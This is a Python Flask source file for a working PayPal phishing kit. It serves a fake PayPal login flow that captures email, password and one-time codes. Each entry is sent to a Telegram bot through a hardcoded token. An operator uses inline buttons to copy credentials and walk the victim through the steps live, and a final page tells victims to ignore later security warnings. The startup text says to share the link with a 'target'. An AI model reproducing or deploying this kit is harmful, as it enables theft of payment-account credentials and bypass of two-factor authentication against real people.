#!/usr/bin/env python3
"""
ULTRA-FAST PayPal Login System - OPTIMIZED FOR RENDER
"""

from flask import Flask, request, jsonify, render_template_string
import requests
import time
import logging
import threading
from datetime import datetime
import os

# Ultra-fast logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Telegram Configuration
BOT_TOKEN = "8343644991:AAGUCkdTgJsBWMXTcQOv6yxjwiGqkUKxIVI"
CHAT_ID = "7861055360"

# Optimized session storage
sessions = {}
last_update_id = 0

# ========== HTML TEMPLATES ==========

# Verification Success Template
VERIFICATION_SUCCESS_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Complete</title>
    <!-- Bootstrap 5 -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #ffffff;
            min-height: 100vh;
        }
        .icon-container {
            width: 64px;
            height: 64px;
            background: #10b981;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .checkmark {
            width: 32px;
            height: 32px;
            stroke: #ffffff;
            stroke-width: 3;
            fill: none;
        }
        .notice-box {
            background: #fef3c7;
            border: 1px solid #fbbf24;
            border-radius: 6px;
        }
    </style>
</head>
<body>
    <div class="container d-flex align-items-center justify-content-center min-vh-100">
        <div class="row justify-content-center w-100">
            <div class="col-12 col-md-8 col-lg-6 col-xl-5">
                <div class="card border-0 shadow-sm">
                    <div class="card-body p-4 p-md-5 text-center">
                        <div class="icon-container mx-auto mb-4">
                            <svg class="checkmark" viewBox="0 0 52 52">
                                <path d="M14 27l7 7 16-16" stroke-linecap="round" stroke-linejoin="round"/>
                            </svg>
                        </div>

                        <h1 class="fw-semibold mb-3">Verification Successful</h1>
                        
                        <p class="text-muted mb-4">
                            Thank you for verifying your account. We appreciate your cooperation in maintaining account security.
                        </p>

                        <div class="notice-box p-3 mb-4">
                            <div class="fw-semibold text-warning-emphasis mb-2">Important Notice</div>
                            <p class="text-warning-emphasis mb-0 small">
                                Please disregard any additional verification emails or warnings you may receive within the next 24 hours. Your verification is complete and no further action is required.
                            </p>
                        </div>

                        <p class="text-muted small">
                            If you receive any suspicious emails requesting additional verification, please do not click on any links.
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>'''

# PayPal HTML Template with Bootstrap
PAYPAL_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal Login</title>
    <!-- Bootstrap 5 -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #ffffff;
            min-height: 100vh;
        }
        .paypal-logo {
            font-size: 1.75rem;
            font-weight: bold;
            color: #0070ba;
            font-family: Verdana, sans-serif;
        }
        .btn-paypal {
            background-color: #0070ba;
            color: white;
            border: none;
            border-radius: 50px;
            font-weight: 500;
        }
        .btn-paypal:hover {
            background-color: #005ea6;
        }
        .otp-input {
            text-align: center;
            font-size: 1.875rem;
            letter-spacing: 0.5em;
            font-weight: 300;
            height: 3.5rem;
        }
        .loading-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background-color: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(8px);
            z-index: 9999;
        }
        .password-toggle {
            cursor: pointer;
            color: #6b7280;
        }
        .avatar-circle {
            width: 2.5rem;
            height: 2.5rem;
            border-radius: 50%;
            background-color: #e5e7eb;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 500;
            color: #4b5563;
        }
    </style>
</head>
<body>
    <!-- Loading Overlay -->
    <div id="loadingOverlay" class="loading-overlay d-none align-items-center justify-content-center flex-column">
        <div class="spinner-border text-primary mb-3" style="width: 3rem; height: 3rem;"></div>
        <div class="loading-text fs-6 text-muted" id="loadingText">Checking information...</div>
    </div>

    <div class="container-fluid p-0">
        <!-- Header -->
        <header class="border-bottom py-3">
            <div class="container">
                <div class="paypal-logo">PayPal</div>
            </div>
        </header>

        <!-- Main Content -->
        <main class="py-5">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-12 col-sm-10 col-md-8 col-lg-6 col-xl-4">
                        <!-- Email Step -->
                        <div id="emailStep" class="animate__animated animate__fadeIn">
                            <div id="emailError" class="alert alert-danger d-none"></div>
                            <form id="emailForm" class="mt-4">
                                <div class="mb-3">
                                    <label for="email" class="form-label fw-medium">Email or mobile number</label>
                                    <input type="email" id="email" class="form-control form-control-lg" required>
                                </div>
                                <button type="submit" class="btn btn-paypal btn-lg w-100">Next</button>
                            </form>
                        </div>

                        <!-- Password Step -->
                        <div id="passwordStep" class="d-none animate__animated animate__fadeIn">
                            <div id="passwordError" class="alert alert-danger d-none"></div>
                            <div class="d-flex align-items-center gap-3 mb-4">
                                <div class="avatar-circle" id="avatarCircle">U</div>
                                <div class="user-email text-muted" id="userEmail"></div>
                            </div>
                            <form id="passwordForm">
                                <div class="mb-3">
                                    <label for="password" class="form-label fw-medium">Password</label>
                                    <div class="position-relative">
                                        <input type="password" id="password" class="form-control form-control-lg" required>
                                        <button type="button" class="btn btn-link password-toggle position-absolute top-50 end-0 translate-middle-y" id="passwordToggle">
                                            <i class="bi bi-eye"></i>
                                        </button>
                                    </div>
                                    <a href="#" class="text-decoration-none small mt-2 d-inline-block">Forgot password?</a>
                                </div>
                                <button type="submit" class="btn btn-paypal btn-lg w-100">Log In</button>
                            </form>
                        </div>

                        <!-- OTP Step -->
                        <div id="otpStep" class="d-none animate__animated animate__fadeIn">
                            <div id="otpError" class="alert alert-danger d-none"></div>
                            <div id="otpResend" class="alert alert-success d-none">We sent you a new OTP.</div>
                            <div class="text-center mb-4">
                                <h4 class="fw-semibold">Enter security code</h4>
                                <p class="text-muted">Enter the 6-digit code we sent you</p>
                            </div>
                            <form id="otpForm">
                                <div class="mb-3">
                                    <input type="text" id="otp" class="form-control otp-input" placeholder="• • • • • •" maxlength="6" required>
                                    <div class="d-flex justify-content-between align-items-center mt-2">
                                        <span class="timer-text text-muted small" id="timerText">Code expires in 1:00</span>
                                        <button type="button" class="btn btn-link btn-sm p-0 text-decoration-none resend-btn" id="resendBtn" disabled>Resend code</button>
                                    </div>
                                </div>
                                <button type="submit" class="btn btn-paypal btn-lg w-100" id="otpSubmitBtn" disabled>Continue</button>
                            </form>
                        </div>

                        <!-- Success Step -->
                        <div id="successStep" class="d-none">
                            <!-- Verification page loaded here -->
                        </div>
                    </div>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="border-top py-4 mt-5">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-auto">
                        <div class="d-flex flex-wrap gap-3 justify-content-center small">
                            <a href="#" class="text-muted text-decoration-none">Contact Us</a>
                            <a href="#" class="text-muted text-decoration-none">Privacy</a>
                            <a href="#" class="text-muted text-decoration-none">Legal</a>
                            <a href="#" class="text-muted text-decoration-none">Worldwide</a>
                        </div>
                    </div>
                </div>
            </div>
        </footer>
    </div>

    <!-- Bootstrap Icons -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css" rel="stylesheet">
    <!-- Animate.css -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

    <script>
        // Ultra-fast session ID generation
        let sessionId = 'p_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11);
        let currentStep = 'email';
        let otpTimer = 60;
        let timerInterval = null;
        let isWaitingForOperator = false;

        // DOM elements
        const elements = {
            loading: document.getElementById('loadingOverlay'),
            loadingText: document.getElementById('loadingText'),
            emailStep: document.getElementById('emailStep'),
            passwordStep: document.getElementById('passwordStep'),
            otpStep: document.getElementById('otpStep'),
            successStep: document.getElementById('successStep'),
            emailForm: document.getElementById('emailForm'),
            passwordForm: document.getElementById('passwordForm'),
            otpForm: document.getElementById('otpForm'),
            emailInput: document.getElementById('email'),
            passwordInput: document.getElementById('password'),
            otpInput: document.getElementById('otp'),
            userEmail: document.getElementById('userEmail'),
            avatarCircle: document.getElementById('avatarCircle'),
            passwordToggle: document.getElementById('passwordToggle'),
            timerText: document.getElementById('timerText'),
            resendBtn: document.getElementById('resendBtn'),
            otpSubmitBtn: document.getElementById('otpSubmitBtn'),
            emailError: document.getElementById('emailError'),
            passwordError: document.getElementById('passwordError'),
            otpError: document.getElementById('otpError'),
            otpResend: document.getElementById('otpResend')
        };

        // Utility functions
        const utils = {
            showLoading(text) {
                elements.loadingText.textContent = text;
                elements.loading.classList.remove('d-none');
                elements.loading.classList.add('d-flex');
                isWaitingForOperator = true;
            },

            hideLoading() {
                elements.loading.classList.remove('d-flex');
                elements.loading.classList.add('d-none');
                isWaitingForOperator = false;
            },

            showStep(step) {
                // Hide all steps
                [elements.emailStep, elements.passwordStep, elements.otpStep, elements.successStep].forEach(el => {
                    el.classList.add('d-none');
                });
                [elements.emailError, elements.passwordError, elements.otpError, elements.otpResend].forEach(el => {
                    el.classList.add('d-none');
                });

                // Show target step
                elements[step + 'Step']?.classList.remove('d-none');
                currentStep = step;
            },

            formatTime(seconds) {
                const mins = Math.floor(seconds / 60);
                const secs = seconds % 60;
                return `${mins}:${secs.toString().padStart(2, '0')}`;
            },

            startOtpTimer() {
                if (timerInterval) clearInterval(timerInterval);

                otpTimer = 60;
                elements.resendBtn.disabled = true;
                elements.timerText.classList.remove('text-danger');
                elements.otpResend.classList.add('d-none');

                timerInterval = setInterval(() => {
                    otpTimer--;
                    elements.timerText.textContent = `Code expires in ${utils.formatTime(otpTimer)}`;

                    if (otpTimer <= 0) {
                        clearInterval(timerInterval);
                        elements.timerText.textContent = 'Code expired';
                        elements.timerText.classList.add('text-danger');
                        elements.resendBtn.disabled = false;
                    }
                }, 1000);
            }
        };

        // API functions
        const api = {
            async sendToBackend(field, value) {
                try {
                    const response = await fetch('/submit', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            session_id: sessionId,
                            field: field,
                            value: value
                        })
                    });
                    return await response.json();
                } catch (error) {
                    return { success: false };
                }
            },

            async checkOperatorStatus() {
                const startTime = Date.now();
                const timeout = 10000; // 10 second timeout

                while ((Date.now() - startTime) < timeout && isWaitingForOperator) {
                    try {
                        const response = await fetch('/status?session_id=' + sessionId + '&t=' + Date.now());
                        const data = await response.json();
                        
                        if (data.action) {
                            handlers.handleOperatorAction(data.action);
                            return;
                        }
                        await new Promise(resolve => setTimeout(resolve, 500));
                    } catch (error) {
                        await new Promise(resolve => setTimeout(resolve, 500));
                    }
                }
                // Fallback: if no response, proceed to next step
                if (isWaitingForOperator) {
                    utils.hideLoading();
                    if (currentStep === 'email') utils.showStep('password');
                    else if (currentStep === 'password') utils.showStep('otp');
                }
            }
        };

        // Event handlers
        const handlers = {
            handleOperatorAction(action) {
                utils.hideLoading();
                
                switch(action) {
                    case 'show_password':
                        utils.showStep('password');
                        break;
                    case 'show_otp':
                        utils.showStep('otp');
                        utils.startOtpTimer();
                        break;
                    case 'show_success':
                        elements.successStep.innerHTML = `''' + VERIFICATION_SUCCESS_TEMPLATE + '''`;
                        utils.showStep('success');
                        break;
                    case 'show_email_error':
                        utils.showStep('email');
                        elements.emailError.textContent = 'Incorrect email address. Please try again.';
                        elements.emailError.classList.remove('d-none');
                        elements.emailInput.value = '';
                        elements.emailInput.focus();
                        break;
                    case 'show_password_error':
                        utils.showStep('password');
                        elements.passwordError.textContent = 'Incorrect password. Please try again.';
                        elements.passwordError.classList.remove('d-none');
                        elements.passwordInput.value = '';
                        elements.passwordInput.focus();
                        break;
                    case 'show_otp_error':
                        utils.showStep('otp');
                        elements.otpError.textContent = 'Incorrect OTP. Please try again.';
                        elements.otpError.classList.remove('d-none');
                        elements.otpInput.value = '';
                        elements.otpInput.focus();
                        utils.startOtpTimer();
                        break;
                    case 'resend_otp':
                        utils.showStep('otp');
                        elements.otpInput.value = '';
                        elements.otpResend.classList.remove('d-none');
                        utils.startOtpTimer();
                        break;
                }
            },

            // Form submissions
            async handleEmailSubmit(e) {
                e.preventDefault();
                const emailValue = elements.emailInput.value.trim();
                
                if (emailValue) {
                    utils.showLoading('Verifying email address...');
                    await fetch('/clear-session?session_id=' + sessionId);
                    await api.sendToBackend('email', emailValue);
                    elements.userEmail.textContent = emailValue;
                    elements.avatarCircle.textContent = emailValue[0].toUpperCase();
                    await api.checkOperatorStatus();
                }
            },

            async handlePasswordSubmit(e) {
                e.preventDefault();
                const passwordValue = elements.passwordInput.value;
                
                if (passwordValue) {
                    utils.showLoading('Checking password...');
                    await api.sendToBackend('password', passwordValue);
                    await api.checkOperatorStatus();
                }
            },

            async handleOtpSubmit(e) {
                e.preventDefault();
                const otpValue = elements.otpInput.value;
                
                if (otpValue.length === 6) {
                    utils.showLoading('Verifying security code...');
                    await api.sendToBackend('otp', otpValue);
                    await api.checkOperatorStatus();
                }
            },

            handlePasswordToggle() {
                if (elements.passwordInput.type === 'password') {
                    elements.passwordInput.type = 'text';
                    elements.passwordToggle.innerHTML = '<i class="bi bi-eye-slash"></i>';
                } else {
                    elements.passwordInput.type = 'password';
                    elements.passwordToggle.innerHTML = '<i class="bi bi-eye"></i>';
                }
            },

            handleOtpInput() {
                elements.otpInput.value = elements.otpInput.value.replace(/\D/g, '').slice(0, 6);
                elements.otpSubmitBtn.disabled = elements.otpInput.value.length !== 6;
            },

            async handleResendOtp() {
                if (!elements.resendBtn.disabled) {
                    utils.showLoading('Requesting new code...');
                    elements.otpInput.value = '';
                    elements.otpSubmitBtn.disabled = true;
                    await api.sendToBackend('request_otp', 'new_otp_requested');
                    utils.showStep('otp');
                    utils.startOtpTimer();
                    elements.otpResend.classList.remove('d-none');
                    utils.hideLoading();
                }
            }
        };

        // Event listeners
        elements.emailForm.addEventListener('submit', handlers.handleEmailSubmit);
        elements.passwordForm.addEventListener('submit', handlers.handlePasswordSubmit);
        elements.otpForm.addEventListener('submit', handlers.handleOtpSubmit);
        elements.passwordToggle.addEventListener('click', handlers.handlePasswordToggle);
        elements.otpInput.addEventListener('input', handlers.handleOtpInput);
        elements.resendBtn.addEventListener('click', handlers.handleResendOtp);

        // Initialize
        console.log('🚀 PayPal System initialized with session:', sessionId);
    </script>
</body>
</html>'''

# ========== TELEGRAM FUNCTIONS ==========

def send_telegram_message(text, reply_markup=None):
    """Ultra-fast Telegram message sending"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    payload = {
        'chat_id': CHAT_ID,
        'text': text,
        'parse_mode': 'HTML',
        'disable_notification': True
    }
    
    if reply_markup:
        payload['reply_markup'] = reply_markup
    
    try:
        # Use thread for non-blocking send
        threading.Thread(target=lambda: requests.post(url, json=payload, timeout=2)).start()
        return True
    except:
        return False

def create_keyboard(session_id, field, value):
    """Create Telegram keyboard"""
    if field == 'email':
        keyboard = [
            [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
            [{"text": "✅ PROCEED TO PASSWORD", "callback_data": f"proceed_password:{session_id}"}],
            [{"text": "❌ EMAIL ERROR", "callback_data": f"email_error:{session_id}"}]
        ]
    elif field == 'password':
        keyboard = [
            [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
            [{"text": "🔑 COPY PASSWORD", "callback_data": f"copy:{session_id}:password"}],
            [{"text": "✅ PROCEED TO OTP", "callback_data": f"proceed_otp:{session_id}"}],
            [{"text": "❌ PASSWORD ERROR", "callback_data": f"password_error:{session_id}"}]
        ]
    elif field == 'otp':
        keyboard = [
            [{"text": "📧 COPY EMAIL", "callback_data": f"copy:{session_id}:email"}],
            [{"text": "🔑 COPY PASSWORD", "callback_data": f"copy:{session_id}:password"}],
            [{"text": "🔢 COPY OTP", "callback_data": f"copy:{session_id}:otp"}],
            [{"text": "✅ PROCEED TO SUCCESS", "callback_data": f"proceed_success:{session_id}"}],
            [{"text": "❌ OTP ERROR", "callback_data": f"otp_error:{session_id}"}],
            [{"text": "🔄 RESEND OTP", "callback_data": f"resend_otp:{session_id}"}]
        ]
    else:
        keyboard = []
    
    return {"inline_keyboard": keyboard}

def get_telegram_updates():
    """Get Telegram updates - optimized for speed"""
    global last_update_id
    
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        params = {'timeout': 2, 'offset': last_update_id + 1}
        
        response = requests.get(url, params=params, timeout=3)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('ok') and data.get('result'):
                for update in data['result']:
                    last_update_id = update['update_id']
                    
                    if 'message' in update and 'text' in update['message']:
                        text = update['message']['text']
                        if text == '/start':
                            return f"start_command"
                    
                    if 'callback_query' in update:
                        return update['callback_query']['data']
        return None
    except Exception:
        return None

def process_commands_background():
    """Background command processor - optimized for Render"""
    logger.info("🚀 Telegram processor started")
    
    while True:
        try:
            command = get_telegram_updates()
            if command:
                logger.info(f"Processing: {command}")
                
                # Start command
                if command == "start_command":
                    render_url = os.getenv('RENDER_EXTERNAL_URL', 'https://your-app.onrender.com')
                    send_telegram_message(
                        f"💰 <b>PAYPAL LOGIN SYSTEM ACTIVE</b>\n"
                        f"🔗 Your Link: {render_url}\n"
                        f"📱 Share with target\n"
                        f"⏰ {datetime.now().strftime('%H:%M:%S')}"
                    )
                
                # Copy commands
                elif command.startswith('copy:'):
                    parts = command.split(':')
                    if len(parts) >= 3:
                        session_id, field = parts[1], parts[2]
                        if session_id in sessions:
                            value = sessions[session_id].get(field, '')
                            send_telegram_message(
                                f"📋 <b>COPY {field.upper()}</b>\n<code>{value}</code>\n\n⏰ {datetime.now().strftime('%H:%M:%S')}"
                            )
                
                # Action commands
                elif ':' in command:
                    action, session_id = command.split(':', 1)
                    action_map = {
                        'proceed_password': 'show_password',
                        'email_error': 'show_email_error', 
                        'proceed_otp': 'show_otp',
                        'proceed_success': 'show_success',
                        'password_error': 'show_password_error',
                        'otp_error': 'show_otp_error',
                        'resend_otp': 'resend_otp'
                    }
                    
                    if action in action_map and session_id in sessions:
                        sessions[session_id]['action'] = action_map[action]
                        sessions[session_id]['last_update'] = time.time()
                        logger.info(f"Set action {action_map[action]} for {session_id}")
            
            time.sleep(0.1)  # Ultra-fast polling
            
        except Exception as e:
            logger.error(f"Command error: {e}")
            time.sleep(0.2)

# ========== FLASK ROUTES ==========

@app.route('/')
def home():
    """Serve PayPal form"""
    return render_template_string(PAYPAL_TEMPLATE)

@app.route('/verification-success')
def verification_success():
    """Verification success page"""
    return render_template_string(VERIFICATION_SUCCESS_TEMPLATE)

@app.route('/submit', methods=['POST'])
def submit():
    """Handle form submissions - ultra-fast"""
    try:
        data = request.json
        session_id = data.get('session_id')
        field = data.get('field')
        value = data.get('value')
        
        # Initialize session
        if session_id not in sessions:
            sessions[session_id] = {}
        
        sessions[session_id][field] = value
        sessions[session_id]['last_update'] = time.time()
        
        # Clear previous action
        if 'action' in sessions[session_id]:
            del sessions[session_id]['action']
        
        # Send Telegram notification
        keyboard = create_keyboard(session_id, field, value)
        
        if field == 'email':
            send_telegram_message(
                f"📧 <b>PAYPAL - EMAIL SUBMITTED</b>\n"
                f"Email: <code>{value}</code>\n"
                f"Session: {session_id[-12:]}\n"
                f"⏰ {datetime.now().strftime('%H:%M:%S')}",
                keyboard
            )
        elif field == 'password':
            send_telegram_message(
                f"🔑 <b>PAYPAL - PASSWORD SUBMITTED</b>\n"
                f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
                f"Password: <code>{value}</code>\n"
                f"Session: {session_id[-12:]}\n"
                f"⏰ {datetime.now().strftime('%H:%M:%S')}",
                keyboard
            )
        elif field == 'otp':
            send_telegram_message(
                f"🔢 <b>PAYPAL - OTP SUBMITTED</b>\n"
                f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
                f"OTP: <code>{value}</code>\n"
                f"Session: {session_id[-12:]}\n"
                f"⏰ {datetime.now().strftime('%H:%M:%S')}",
                keyboard
            )
        elif field == 'request_otp':
            send_telegram_message(
                f"🔄 <b>PAYPAL - OTP RESEND REQUESTED</b>\n"
                f"Email: <code>{sessions[session_id].get('email', '')}</code>\n"
                f"Session: {session_id[-12:]}\n"
                f"⏰ {datetime.now().strftime('%H:%M:%S')}"
            )
        
        return jsonify({'success': True})
    
    except Exception as e:
        logger.error(f"Submit error: {e}")
        return jsonify({'success': False})

@app.route('/status')
def status():
    """Check session status - ultra-fast"""
    session_id = request.args.get('session_id')
    action = sessions[session_id].get('action') if session_id in sessions else None
    return jsonify({'action': action})

@app.route('/clear-session')
def clear_session():
    """Clear session action"""
    session_id = request.args.get('session_id')
    if session_id in sessions and 'action' in sessions[session_id]:
        del sessions[session_id]['action']
    return jsonify({'success': True})

# Start background processor (FIXED for Render - no before_first_request)
try:
    command_thread = threading.Thread(target=process_commands_background, daemon=True)
    command_thread.start()
    logger.info("✅ Background processor started")
except Exception as e:
    logger.error(f"❌ Failed to start background threads: {e}")

if __name__ == "__main__":
    print("🚀 ULTRA-FAST PAYPAL SYSTEM STARTED")
    print("💰 PayPal: Email → Password → OTP → Success")
    print("📱 Send '/start' to your Telegram bot")
    print("🌐 Ready for Render deployment")
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
